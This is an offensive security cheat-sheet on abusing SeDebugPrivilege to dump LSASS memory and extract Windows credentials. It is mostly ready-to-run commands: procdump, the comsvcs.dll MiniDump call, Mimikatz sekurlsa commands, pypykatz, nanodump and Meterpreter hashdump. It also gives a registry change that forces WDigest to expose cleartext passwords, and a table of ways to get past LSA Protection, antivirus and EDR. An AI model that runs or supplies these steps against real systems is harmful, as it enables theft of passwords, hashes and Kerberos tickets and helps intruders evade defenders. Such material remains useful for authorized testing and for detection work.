---
title: 'SeDebugPrivilege — LSASS Credential Dumping'
description: 'Exploiting SeDebugPrivilege to dump LSASS process memory and extract Windows credentials — procdump, comsvcs.dll, Mimikatz, Task Manager, and pypykatz.'
---

# SeDebugPrivilege — LSASS Credential Dumping

## When You See This Privilege

- Members of the **Administrators** group (even without UAC elevation in some configs)
- Explicitly granted via Local Security Policy or Group Policy

```cmd
whoami /priv | findstr SeDebug
```

---

## What SeDebug Allows

`SeDebugPrivilege` lets you open a handle to **any process** with `PROCESS_ALL_ACCESS`, regardless of the process's security descriptor. This includes `lsass.exe`, which stores credentials in memory.

---

## What You Get from LSASS

| Credential Type | Description | Use Case |
|:---------------|:-----------|:---------|
| **NTLM hashes** | NT hash of user passwords | Pass-the-Hash (PtH) |
| **Cleartext passwords** | If WDigest is enabled | Direct authentication |
| **Kerberos TGT/TGS** | Ticket Granting Tickets | Pass-the-Ticket (PtT) |
| **DPAPI master keys** | Decryption keys for user secrets | Decrypt saved passwords, certs |
| **MSV1_0 credentials** | Cached logon data | Offline cracking |

!!! tip "When are cleartext passwords available?"
    - **Windows 2008 R2 / Windows 7 and older**: WDigest enabled by default → cleartext in memory
    - **Windows 2012 / Windows 8+**: WDigest disabled by default
    - **Force WDigest on newer systems** (requires admin, for persistence): `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f` — then wait for a user to log in again

---

## Method 1: Procdump (Sysinternals) — Lowest Detection

Signed Microsoft binary → less likely to trigger AV/EDR.

```cmd
:: Dump LSASS process memory to disk
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

Then extract credentials offline on your attacker machine:

```
mimikatz# sekurlsa::minidump C:\temp\lsass.dmp
mimikatz# sekurlsa::logonPasswords
```

---

## Method 2: comsvcs.dll — No External Tools

Uses a built-in Windows DLL. Nothing to transfer to the target.

```cmd
:: Step 1: Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

:: Step 2: Dump using rundll32 (replace 672 with actual PID)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full
```

```powershell
# PowerShell version (auto-finds PID)
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
```

!!! warning "Must Run from Elevated Context"
    The `comsvcs.dll` method requires an elevated (High Integrity) process. If you're in a Medium Integrity shell, you'll need to bypass UAC first.

---

## Method 3: Task Manager — GUI Access Only

1. Open **Task Manager** (`Ctrl+Shift+Esc`)
2. Click **More details** if in simple view
3. Go to **Details** tab
4. Right-click `lsass.exe` → **Create dump file**
5. Note the saved path (usually `%TEMP%\lsass.DMP`)
6. Transfer to attacker machine
7. Parse with Mimikatz or pypykatz

---

## Method 4: Mimikatz — Direct Extraction

If you can run Mimikatz on the target:

```
:: Enable debug privilege
mimikatz# privilege::debug

:: Dump all logon credentials
mimikatz# sekurlsa::logonPasswords

:: Dump specific credential types
mimikatz# sekurlsa::msv          :: NTLM hashes
mimikatz# sekurlsa::kerberos     :: Kerberos tickets
mimikatz# sekurlsa::wdigest      :: WDigest cleartext
mimikatz# sekurlsa::tspkg        :: Terminal Services
```

---

## Method 5: pypykatz — Offline Python Parsing

Parse LSASS dumps on your Linux attacker machine without Mimikatz.

```bash
# Install
pip3 install pypykatz

# Parse the dump
pypykatz lsa minidump lsass.dmp

# Output specific formats
pypykatz lsa minidump lsass.dmp -o json > creds.json
```

---

## Method 6: nanodump — Evasive Dumping

Modern, stealthy LSASS dumping tool designed to evade EDR.

**Repo**: [github.com/helpsystems/nanodump](https://github.com/helpsystems/nanodump)

```cmd
:: Create a minidump of LSASS
nanodump.exe --write C:\temp\lsass.dmp

:: Dump to a named pipe (avoids writing to disk)
nanodump.exe --fork --write \\.\pipe\dump
```

---

## Alternative: Process Memory Without SeDebug

If you don't have `SeDebugPrivilege` but have SYSTEM access via another method:

```cmd
:: Migrate to lsass.exe in Meterpreter
meterpreter> ps              :: find lsass PID
meterpreter> migrate PID
meterpreter> hashdump

:: Or load kiwi (Mimikatz module)
meterpreter> load kiwi
meterpreter> creds_all
```

---

## Defenses You May Encounter

| Defense | Impact | Bypass |
|:--------|:-------|:-------|
| **LSA Protection (RunAsPPL)** | Blocks unsigned processes from reading LSASS | Use signed tools (procdump), or load vuln driver to disable PPL |
| **Credential Guard** | Isolates creds in VBS hypervisor container | Cannot bypass from OS level — look for creds elsewhere |
| **Windows Defender / AV** | Blocks known tools (Mimikatz, procdump) | Use comsvcs.dll, nanodump, or custom tools |
| **EDR** | Detects LSASS access patterns | Use indirect methods, fork processes, or avoid LSASS entirely |
